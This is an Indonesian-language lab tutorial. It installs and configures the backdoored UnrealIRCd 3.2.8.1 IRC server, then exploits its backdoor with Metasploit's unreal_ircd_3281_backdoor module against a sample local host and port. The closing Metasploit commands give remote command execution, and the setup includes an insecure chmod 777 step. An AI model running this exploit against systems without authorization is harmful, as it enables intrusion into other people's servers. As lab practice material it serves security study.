# Metasploit

## UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)

### Pemasangan UnrealIRCd

unduh programnya di link berikuut [ini](https://www.exploit-db.com/apps/752e46f2d873c1679fa99de3f52a274d-Unreal3.2.8.1_backdoor.tar_.gz)
kemudian ekstrak ke tempat yang sama.

Install dependencies.
```bash
apt-get install build-essential
apt-get install openssl
apt-get install libcurl4-openssl-dev
```

Masuk ke folder Unreal3.2 yang telah diekstrak tadi
```bash
cd Unreal3.2
```

Jalankan perintah berikut
```bash
chmod 777 *;
./Config
```

Akan muncul pertanyaan-pertanyaan.
```
 Do you want to enable the server anti-spoof protection?
 ```
Jawab "Yes". Lebih baik memakai proteksi ini. Default: "No".


Lewati pertanyaan-pertanyaan di bawah ini (langsung saja tekan "Enter"):
```bash
What directory are all the server configuration files in?
What is the path to the ircd binary including the name of the binary?
Would you like to compile as a hub or as a leaf?
What is the hostname of the server running your IRCd?
What should the default permissions for your configuration files be?
```
Untuk pertanyaan selanjutnya jika ingin memasang library SSL Jawab "Yes". Jika tidak langsung tekan "Enter"
```bash
Do you want to support SSL (Secure Sockets Layer) connections?
```

Selanjutnya jika menjawab "Yes" maka isi pertanyaan di bawah ini dengan lokasi SSL yang benar:
```bash
If you know the path to OpenSSL on your system, enter it here. If not leave this blank
```

Lewati pula pertanyaan-pertanyaan di bawah ini:
```bash
Do you want to enable IPv6 support?
Do you want to enable ziplinks support?
Do you want to enable remote includes?
How far back do you want to keep the nickname history?
What is the maximum sendq length you wish to have?
How many buffer pools would you like?
How many file descriptors (or sockets) can the IRCd use?
Would you like any more parameters to configure?
```

Kembali lagi dengan permasalahan tadi. Jika jawaban dari pertanyaan
```bash
If you know the path to OpenSSL on your system, enter it here. If not leave this blank
```
adalah "Yes", maka akan muncul pertanyaan selanjutnya.
```bash
 Country Name. Enter the country name that the server is located in, eg. US for United States.
 State/Province. Input the state or province that your server is located in.
 Locality name. Enter the city that your server is located in, eg. Miami.
 Organization Name. Enter the name of your entity, eg. TestIRC.
 Organizational Unit Name. An example could be "Technical Dept."
 Common Name. Enter the domain that points to your server, eg. servername.TestIRC.net. 
```
Isilah pertanyaan tersebut sesuai keinginan Anda.

Pengaturan awal sudah selesai.
Sekarang ketikkan perintah di bawah ini
```bash
make
```

## Mengatur UnrealIRCd.conf

### a. srample.conf
File konfigurasi ini sangat penting. Sesudah menjalankan perintah di atas jalankan perintah di bawah ini:
```bash
cp doc/example.conf unrealircd.conf
```

Sekarang saatnya mengotak-atik pengaturan unrealircd.conf.

Gunakan text editor yang biasa Anda gunakan.

Pada bagian ini, perlu sedikit-banyak otak-atik.

Jika Anda menggunakan Linux, hapus dua garis miring("/") pada baris di baris-35 dan 36.
Atau jika Anda menggunakan Windows, hapus dua garis miring("/") pada baris-40 dan 41.
```bash
/* FOR *NIX, uncomment the following 2lines: */
//loadmodule "src/modules/commands.so";
//loadmodule "src/modules/cloak.so";

/* FOR Windows, uncomment the following 2 lines: */
//loadmodule "modules/commands.dll";
//loadmodule "modules/cloak.dll";
```

Kemudian cari blok Me pada baris-68
```bash
me
{
	name "irc.foonet.com";
	info "FooNet Server";
	numeric 1;
};
```
Ubah sesuai keinginan Anda.

Kemudian cari blok Admin pada baris-87
```bash
admin {
	"Bob Smith";
	"bob";
	"widely@used.name";
};
```
Ubah sesuai keinginan Anda.

Kemudian cari blok Oper pada baris-198
```bash
oper bobsmith {
	class           clients;
	from {
		userhost bob@smithco.com;
	};
	password "f00";
	flags
	{
		netadmin;
		can_zline;
		can_gzline;
		can_gkline;
		global;
	};
};
```
Ubah sesuai keinginan Anda

Kemudian cari blok service line pada baris-312
```bash
link            hub.mynet.com
{
	username	*;
	hostname 	1.2.3.4;
	bind-ip 	*;
	port 		7029;
	hub             *;
	password-connect "LiNk";
	password-receive "LiNk";
	class           servers;
		options {
			/* Note: You should not use autoconnect when linking services */
			autoconnect;
			ssl;
			zip;
		};
};
```
Ubah sesuai keinginan Anda.

Kemudian cari blok network setting pada baris-702
```bash
set {
	network-name 		"ROXnet";
	default-server 		"irc.roxnet.org";
	services-server 	"services.roxnet.org";
	stats-server 		"stats.roxnet.org";
	help-channel 		"#ROXnet";
	hiddenhost-prefix	"rox";
	/* prefix-quit 		"no"; */
	/* Cloak keys should be the same at all servers on the network.
	 * They are used for generating masked hosts and should be kept secret.
	 * The keys should be 3 random strings of 5-100 characters
	 * (10-20 chars is just fine) and must consist of lowcase (a-z),
	 * upcase (A-Z) and digits (0-9) [see first key example].
	 * HINT: On *NIX, you can run './unreal gencloak' in your shell to let
	 *       Unreal generate 3 random strings for you.
	 */
	cloak-keys {
		"aoAr1HnR6gl3sJ7hVz4Zb7x4YwpW";
		"and another one";
		"and another one";
	};
	/* on-oper host */
	hosts {
		local		"locop.roxnet.org";
		global		"ircop.roxnet.org";
		coadmin		"coadmin.roxnet.org";
		admin		"admin.roxnet.org";
		servicesadmin 	"csops.roxnet.org";
		netadmin 	"netadmin.roxnet.org";
		host-on-oper-up "no";
	};
};
```
Ubah sesuai keinginan Anda.

Kemudian cari blok server setting pada baris-737
```bash
set {
	kline-address "set.this.email";
	modes-on-connect "+ixw";
	modes-on-oper	 "+xwgs";
	oper-auto-join "#opers";
	options {
		hide-ulines;
		/* You can enable ident checking here if you want */
		/* identd-check; */
		show-connect-info;
	};

	maxchannelsperuser 10;
	/* The minimum time a user must be connected before being allowed to use a QUIT message,
	 * This will hopefully help stop spam */
	anti-spam-quit-message-time 10s;
	/* Make the message in static-quit show in all quits - meaning no
           custom quits are allowed on local server */
	/* static-quit "Client quit";	*/

	/* You can also block all part reasons by uncommenting this and say 'yes',
	 * or specify some other text (eg: "Bye bye!") to always use as a comment.. */
	/* static-part yes; */

	/* This allows you to make certain stats oper only, use * for all stats,
	 * leave it out to allow users to see all stats. Type '/stats' for a full list.
	 * Some admins might want to remove the 'kGs' to allow normal users to list
	 * klines, glines and shuns.
	 */
	oper-only-stats "okfGsMRUEelLCXzdD";

	/* Throttling: this example sets a limit of 3 connection attempts per 60s (per host). */
	throttle {
		connections 3;
		period 60s;
	};

	/* Anti flood protection */
	anti-flood {
		nick-flood 3:60;	/* 3 nickchanges per 60 seconds (the default) */
	};

	/* Spam filter */
	spamfilter {
		ban-time 1d; /* default duration of a *line ban set by spamfilter */
		ban-reason "Spam/Advertising"; /* default reason */
		virus-help-channel "#help"; /* channel to use for 'viruschan' action */
		/* except "#help"; channel to exempt from filtering */
	};
};
```
Ubah sesuai keinginan Anda

### b. https://wiki.swiftirc.net/wiki/Installing_and_Configuring_UnrealIRCd-Conf
Perbedaan cara (b) adalah isinya yang lebih singkat dari cara (a).
Ini dikarenakan file (b) lebih sedikit mengandung komentar.
Untuk Pengubahannya hampir sama dengan cara (a).


Langkah terakhir jalankan UnrealIRCd
```bash
./unreal start
```


-- -- --


### Jalankan Metaxploit
```bash
msfconsole
```

### Gunakan exploit *UnrealIRCd 3.2.8.1 - Backdoor Command Execution*
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

##### Atur tujuan exploit
*192.168.0.101* sebagai contoh
```bash
set TARGET 192.168.0.101
```

### Tujuan dapat juga diatur dengan syntax berikut
```bash
set RHOST 192.168.0.101
```
### Atur port (jika perlu)
di sini service port yang digunakan oleh UnrealIRC adalah 6606
```bash
set RPORT 6606
```

### Eksekusi exploit
```bash
exploit
```
